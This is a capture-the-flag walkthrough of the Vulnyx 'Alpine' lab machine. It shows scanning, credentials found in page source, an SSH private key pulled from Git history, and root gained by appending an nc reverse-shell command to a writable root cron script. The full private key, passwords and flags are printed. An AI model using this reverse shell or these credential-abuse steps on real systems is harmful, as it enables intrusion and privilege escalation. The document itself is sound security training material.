# Vulnyx: Alpine

| | |
|---|---|
| **Platform** | Vulnyx |
| **OS** | Linux |
| **Difficulty** | Easy |
| **Creator** | `Soraya` |
| **Tools used** | `nmap` · `gobuster` · `hydra` · `git` · `ssh` · `nc` |
| **Tags** | `#InfoDisclosure` `#HardcodedCreds` `#GitHistory` `#CronAbuse` |
| **URL** | https://vulnyx.com/machines/ |

A set of hardcoded credentials, left in the web app's front-end source code, gives SSH access as `developer`. From there, a private key recovered from the Git history leads to `sysadmin`. The last piece is a maintenance script that runs with elevated privileges but can be edited by `sysadmin` — writing a reverse shell into it is enough to reach root.

## Enumeration

### Port Scanning

A full TCP port scan is run first:

```Bash
$ sudo nmap -p- -sS --open --min-rate 5000 -n -vvv -Pn alpine.nyx

PORT     STATE     SERVICE     REASON
22/tcp   open      ssh         syn-ack ttl 64
80/tcp   open      http        syn-ack ttl 64
MAC Address:   08:00:27:C8:31:80   (Oracle VirtualBox virtual NIC)
```

Two ports come back open: **22 (SSH)** and **80 (HTTP)**. A version/script scan against both fills in the details:

```Bash
$ sudo nmap -p 22,80 -sCV alpine.nyx

PORT     STATE     SERVICE     VERSION
22/tcp   open      ssh         OpenSSH 10.2 (protocol 2.0)
80/tcp   open      http        Apache httpd 2.4.66
|_http-server-header: Apache/2.4.66 (Unix)
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: SnowPeak Mountain Resort
MAC Address:   08:00:27:C8:31:80   (Oracle VirtualBox virtual NIC)
```

### Web Enumeration

The main page:

```
http://alpine.nyx
```
<img src="../Images/alpine/Pasted image 20260715165456.png"/>

A directory scan is run next, to catch pages that aren't linked from the front page:

```Bash
$ gobuster dir -u http://alpine.nyx/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .php,.html,.txt

===============================================================
Starting gobuster in directory enumeration mode
===============================================================
index.html           (Status: 200) [Size: 12461]
login.html           (Status: 200) [Size: 3182]
profile.html         (Status: 200) [Size: 9571]
booking.html         (Status: 200) [Size: 3217]
server-status        (Status: 403) [Size: 313]
===============================================================
Finished
===============================================================
```

`login.html` and `profile.html` stand out among the results.

#### login.html

```
http://alpine.nyx/login.html
```
<img src="../Images/alpine/Pasted image 20260715165602.png"/>

The rendered page gives nothing away, so the source is checked next:

```
view-source:http://alpine.nyx/login.html
```
<img src="../Images/alpine/Pasted image 20260715165718.png"/>

A set of credentials sits hardcoded in the markup:

> **Credentials found:** `testuser:WinterIsComing!`

This is a client-side information disclosure. Anything embedded in HTML or JavaScript — a check, a comparison, a "hidden" value — ships straight to the browser and can be read by anyone who opens the page source, whether or not it was meant to stay hidden.

#### profile.html

```
http://alpine.nyx/profile.html
```
<img src="../Images/alpine/Pasted image 20260715165900.png"/>

The same pattern shows up again: a second set of credentials, also exposed in the front-end.

> **Credentials found:** `developer:SummerVibes2024!`

## Initial Access

Both credential pairs are worth testing against SSH, the only other exposed service. `hydra` handles the validation:

```Bash
$ hydra -l 'developer' -p 'SummerVibes2024!' ssh://alpine.nyx

[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 1 task per 1 server, overall 1 task, 1 login try (l:1/p:1), ~1 try per task
[DATA] attacking ssh://alpine.nyx:22/
[22][ssh] host: alpine.nyx   login: developer   password: SummerVibes2024!
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-07-22 04:58:
```

The `developer` credentials check out, and a connection follows:

```Bash
$ ssh developer@alpine.nyx

Welcome to Alpine!

developer@alpine:~$ id
uid=1000(developer) gid=1000(developer) groups=1000(developer)
developer@alpine:~$ ls -l /home/developer
total 8
-rw-r--r--    1 developer developer       328 Dec 11  2025 README.txt
-r--------    1 developer developer        33 Dec 11  2025 user.txt
developer@alpine:~$ cat /home/developer/user.txt 
30a0cf321ff0c0997f45a7202490b260
```
> **User flag:** `30a0cf321ff0c0997f45a7202490b260`

## Lateral Movement

### Shell as sysadmin

The other home directories are worth a look next:

```Bash
developer@alpine:~$ ls -l /home
total 8
drwxr-sr-x    3 developer developer      4096 Dec 12  2025 developer
drwxr-sr-x    4 sysadmin sysadmin      4096 Jul 15 14:12 sysadmin
developer@alpine:~$ ls -l /home/sysadmin
total 8
-rw-r--r--    1 sysadmin sysadmin       282 Dec 11  2025 NOTES.txt
drwxr-xr-x    3 sysadmin sysadmin      4096 Dec 11  2025 webapp
developer@alpine:~$ cat /home/sysadmin/NOTES.txt
=== System Administration Notes ===

TASKS COMPLETED:
[x] Setup webapp git repository
[x] Configure SSH keys for remote access
[x] Clean up sensitive files from git repo

PENDING:
[ ] Speak about the automated cleanup strategy. It currently runs every two minutes


- SysAdmin Team
developer@alpine:~$ ls -la /home/sysadmin/webapp
total 16
drwxr-xr-x    3 sysadmin sysadmin      4096 Dec 11  2025 .
drwxr-sr-x    4 sysadmin sysadmin      4096 Jul 15 14:12 ..
drwxr-xr-x    7 sysadmin sysadmin      4096 Dec 11  2025 .git
-rwxr-xr-x    1 sysadmin sysadmin       171 Dec 11  2025 config.php
```

Two things stand out here. `NOTES.txt` mentions a "cleanup strategy" running every two minutes — worth keeping in mind, since it hints at a cron job before any cron file gets checked directly. And `/home/sysadmin/webapp` is a Git repository. The working tree itself is clean, but that doesn't rule out much: deleting a file and committing that change doesn't erase it from history, since the object stays reachable from earlier commits until history is explicitly rewritten and garbage-collected. That makes the commit log worth checking:

```Bash
developer@alpine:/home/sysadmin/webapp$ git log --pretty=oneline | head
0c6ee270764eb91ee53afc9784881371d4dddd93 Remove backup
02f9a1879dbfa40703a6bcbd985e5a19542c24c8 Backup SSH keys before server migration
2823ba92f4fdee9b5d71e74f9f060a5d5ed3b593 Initial commit: Add database config

developer@alpine:/home/sysadmin/webapp$  git --no-pager log -p 02f9a1879dbfa40703a6bcbd985e5a19542c24c8
developer@alpine:/home/sysadmin/webapp$  git --no-pager show -p 02f9a1879dbfa40703a6bcbd985e5a19542c24c8:.ssh-backup/id_rsa
```

The "Backup SSH keys before server migration" commit is the interesting one — its diff points to a `.ssh-backup/` folder, and pulling that path directly with `git show` returns a full private key:

```
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
NhAAAAAwEAAQAAAQEA3ZnZAOyE5gZN5QxDnRnYnRfXHwCavg4mJz2HbUWI7p3lGi+tdL6u
IbqPyjqbH69DcyQCubvORi4domdpqTchLF7PyJlUBHVIo3AULC1kVhMqGvctWQxAgPRvr7
zM7HGr+NpTPEkM/4BjfJToy706FGjfiXBhjkSiv5cHOlnXxhO44NkKSxvySnXkmYq3PNNF
5OtjZJg+7+XrZKoUsaipupjOcZgsQCx1Yf1xE4gWIi/jS9kY07R0GtNdqaW2Z9UwXYGMFW
xGKPtczHbRgcxtdP9ne71C/Zh5zsTPtgWWx8cO+P0N0emTYNDEMlD+4IH9AygBbnAzY978
qc2jiRSxJwAAA8jbDUur2w1LqwAAAAdzc2gtcnNhAAABAQDdmdkA7ITmBk3lDEOdGdidF9
cfAJq+DiYnPYdtRYjuneUaL610vq4huo/KOpsfr0NzJAK5u85GLh2iZ2mpNyEsXs/ImVQE
dUijcBQsLWRWEyoa9y1ZDECA9G+vvMzscav42lM8SQz/gGN8lOjLvToUaN+JcGGORKK/lw
c6WdfGE7jg2QpLG/JKdeSZirc800Xk62NkmD7v5etkqhSxqKm6mM5xmCxALHVh/XETiBYi
L+NL2RjTtHQa012ppbZn1TBdgYwVbEYo+1zMdtGBzG10/2d7vUL9mHnOxM+2BZbHxw74/Q
3R6ZNg0MQyUP7ggf0DKAFucDNj3vypzaOJFLEnAAAAAwEAAQAAAQAlkP0uoOnurMbru2aC
7WzBRNddFBcnfPKO2Glq5szN1sqN4+M91U1jvmK9362Ic4e1rzcfEW1ojEzNyUYqP4RKJ1
CGKygJEXDc9BUXYCKQTPNoWtq/K8qLkeSVICaFNsf2idxubdvcPIGhDwVf9JYx+41ZmUmQ
eqY0YIADLlPb6g8z0Cgr0cEQg9PEBUi5FZAhji0hIz9k7BAfAzBaed94y+IPF0gG8AtsRm
oo9XlqTuiphbkNyTVPzE9mKoqR8pECqSLAcx5+YBFP6tOoKh1BwHqWBG5ixw3fWi2HvgPv
WeVRTozvXzjP1fVlYi/KyayuOLuiwQrlWvtkXwB4S3cRAAAAgEoibXJoCwzdf1naZQ4yZr
aHnU5Mkx1XsO3X2bWXdIRZzQuLjAlmbwjQyMRWkiRb12D2uc1LwwQ1lzlBOqnCRXjFpM28
/M8V6ZwYMP5bJeOGJSKEaikzY7blksM2Pls2P8zuhLiL3DnvQlB/7whKfME2MwH4tBDYTO
7mS6MbKIElAAAAgQD1zPzaJsyt7gAjYgn/v0Wzj7HfVlLqeLR8TGup5MP8uDq6IJV5pLkf
S8I4dGTOfrhgTw4VNbwy/BZNZErVnKa+zt6EsHgSqFub5ZVgpwRWx6bkk7lKPikZ62uNye
gtqE7uJVBu12Li4kWuzyF2/IhcSh1Sp9B7fnF6p5b+t1H84wAAAIEA5svMbW9WTDB5hvgo
ii5H6OZuIPGNKeEndKVquBeLjKR2QQrK9KQ0d/OgIu4ioEOmQ+NA1tWKr5uXJ4hdBvDCoS
4tqjiIBNSTx1qkV6tpcbKDaIjTzdCvAJ8wOMymShOVVJkmXvgIsJuydR7OQ+StvR0DRDGp
rkFejyhcyFIbke0AAAARc3lzYWRtaW5Ac25vd3BlYWsBAg==
-----END OPENSSH PRIVATE KEY-----
```

The key is copied into a local file and given the right permissions — SSH refuses to use a private key that's readable by group or others:

```Bash
$ nano sysadmin_rsa
$ chmod 600 sysadmin_rsa
```

```Bash
$ ssh -i sysadmin_rsa sysadmin@alpine.nyx
Welcome to Alpine!

sysadmin@alpine:~$ id
uid=1001(sysadmin) gid=1001(sysadmin) groups=1001(sysadmin)
```

## Privilege Escalation

```Bash
sysadmin@alpine:~$ ls -l /opt/scripts
total 4
-rwxrwxr-x    1 root     sysadmin       267 Jul 15 14:12 cleanup.sh
sysadmin@alpine:~$ cat /opt/scripts/cleanup.sh 
#!/bin/sh
# System cleanup script
# Cleans temporary files older than 7 days
find /tmp -type f -mtime +7 -delete 2>/dev/null
find /var/tmp -type f -mtime +7 -delete 2>/dev/null
echo "[$(date)] Cleanup completed" >> /var/log/cleanup.log
```

`sysadmin` has write access to `/opt/scripts/cleanup.sh`, owned by `root`. That combination is what makes this exploitable: a script runs with the privileges of whoever — or whatever — triggers it, not the privileges of whoever last edited the file. `NOTES.txt` already hinted at the missing piece — the cleanup script runs every two minutes, almost certainly via a root-owned cron job. Anything appended to the script now runs as root the next time that job fires.

### Shell as root

A reverse shell payload gets appended to the script:

```Bash
sysadmin@alpine:~$ echo 'nc 10.0.2.15 9001 -e /bin/bash' >> /opt/scripts/cleanup.sh
```

The `-e` flag tells `nc` to bind a shell to the connection once it's established. It's a build-dependent feature — not every version of `nc` supports it, so it's worth confirming with `nc -h` if the payload doesn't connect back.

A listener is set up to catch the callback once the script runs again:

```Bash
$ nc -nlvp 9001                   
listening on [any] 9001 ...
connect to [10.0.2.15] from (UNKNOWN) [10.0.2.41] 43763
id
uid=0(root) gid=0(root) groups=0(root),0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
ls -l /root
total 4
-r--------    1 root     root            33 Dec 11  2025 root.txt
cat /root/root.txt
6b75b087f12ed42f124d68493469a493
```
> **Root flag:** `6b75b087f12ed42f124d68493469a493`

## Takeaways

- Client-side "authentication" or secrets embedded in HTML/JS are not secrets — anything shipped to the browser is visible to anyone who checks the page source.
- Removing a file from a Git working tree doesn't remove it from history; sensitive files committed by mistake stay recoverable unless history is explicitly rewritten.
- File permissions and execution context are two separate things. `cleanup.sh` was group-writable by `sysadmin` (`rwxrwxr-x`), but cron spawns the process as `root` regardless of who holds write access to the file — the resulting process inherits root's UID, not the UID of whoever last edited the script.